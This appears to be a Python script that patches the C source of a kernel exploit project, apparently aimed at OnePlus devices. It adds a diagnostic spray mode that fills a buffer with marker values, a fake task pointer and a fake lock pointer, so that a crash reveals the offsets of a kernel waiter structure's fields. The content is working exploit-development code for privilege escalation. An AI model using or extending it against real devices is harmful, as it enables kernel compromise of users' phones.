fops = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(fops).read()
if "SSOPT_SCAN2" not in s:
    old = ('    } else if (env_flag("SSOPT_RANGE", 0)) {\n'
           '      /* diagnostic: paint a solid run so a wrong offset still hits lock */\n'
           '      for (int i = 0x10; i <= 0x58; i += 8) put64(buf, i, fake_lock);\n')
    assert s.count(old) == 1, s.count(old)
    new = ('    } else if (env_flag("SSOPT_SCAN2", 0)) {\n'
           '      /* probe: distinct marker per slot, but keep lock valid so the walk\n'
           '       * passes trylock and reaches rb_erase; panic x24 -> slot of\n'
           '       * waiter->lock, x9 -> slot of waiter->tree_entry.parent_color */\n'
           '      for (int i = 0; i < 0x60; i += 8)\n'
           '        put64(buf, i, 0x1a2b00000000ULL + (uint64_t)i);\n'
           '      put64(buf, 0x40, fake_task);\n'
           '      put64(buf, 0x48, fake_lock);\n'
           '    } else if (env_flag("SSOPT_RANGE", 0)) {\n'
           '      /* diagnostic: paint a solid run so a wrong offset still hits lock */\n'
           '      for (int i = 0x10; i <= 0x58; i += 8) put64(buf, i, fake_lock);\n')
    s = s.replace(old, new)
    # paint_len must be 0x60 for SCAN2 too
    old2 = ('    socklen_t paint_len = (env_flag("SSOPT_RANGE", 0) || env_flag("SSOPT_SCAN", 0))\n'
            '                               ? 0x60 : 0x50;')
    assert s.count(old2) == 1, s.count(old2)
    new2 = ('    socklen_t paint_len = (env_flag("SSOPT_RANGE", 0) || env_flag("SSOPT_SCAN", 0) ||\n'
            '                            env_flag("SSOPT_SCAN2", 0))\n'
            '                               ? 0x60 : 0x50;')
    s = s.replace(old2, new2)
    open(fops, "w").write(s)
    print("SSOPT_SCAN2 added")
else:
    print("already")
